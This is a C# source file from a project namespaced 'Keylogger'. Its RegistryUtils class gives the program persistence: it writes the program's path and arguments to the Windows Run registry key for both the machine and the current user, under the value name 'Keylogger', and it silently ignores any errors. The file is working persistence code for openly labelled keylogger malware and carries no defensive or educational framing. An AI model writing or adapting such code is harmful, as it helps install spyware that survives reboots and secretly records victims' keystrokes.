using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Keylogger
{
    class RegistryUtils
    {
        private const string _regKeyLoc = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private readonly string _regValue;

        public RegistryUtils(string location, string[] args)
        {
            _regValue = $"{location} {string.Join(" ", args)}";
        }

        public bool SetMachineRunOnceKey()
        {
            try
            {
                Registry.LocalMachine.CreateSubKey(_regKeyLoc).SetValue("Keylogger", _regValue);
            }
            catch (Exception _)
            {
                return false;
            }

            return true;
        }

        public void SetUserRunOnceKey()
        {
            try
            {
                Registry.CurrentUser.CreateSubKey(_regKeyLoc).SetValue("Keylogger", _regValue);
            }
            catch (Exception _)
            {
            }
        }
    }
}
